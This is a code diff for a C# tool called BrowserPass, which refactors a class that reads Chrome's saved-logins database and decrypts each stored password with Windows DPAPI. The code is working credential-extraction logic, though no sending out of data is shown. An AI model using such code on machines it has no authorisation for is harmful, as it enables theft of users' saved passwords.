@@ -10,13 +10,16 @@ namespace BrowserPass
     /// <summary>
     /// http://raidersec.blogspot.com/2013/06/how-browsers-store-your-passwords-and.html#chrome_decryption
     /// </summary>
-    class ChromePassReader
+    class ChromePassReader : IPassReader
     {
+        public string BrowserName { get { return "Chrome"; } }
+
         private const string LOGIN_DATA_PATH = "\\..\\Local\\Google\\Chrome\\User Data\\Default\\Login Data";
+
         
-        public IEnumerable<BrowserCredential> ReadPasswords()
+        public IEnumerable<CredentialModel> ReadPasswords()
         {
-            var result = new List<BrowserCredential>();
+            var result = new List<CredentialModel>();
 
             var appdata = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);// APPDATA
             var p = Path.GetFullPath(appdata + LOGIN_DATA_PATH);
@@ -38,7 +41,7 @@ namespace BrowserPass
                                 {
                                     var pass = Encoding.UTF8.GetString(ProtectedData.Unprotect(GetBytes(reader, 2), null, DataProtectionScope.CurrentUser));
 
-                                    result.Add(new BrowserCredential() {
+                                    result.Add(new CredentialModel() {
                                          Url = reader.GetString(0),
                                          Username = reader.GetString(1),
                                          Password = pass
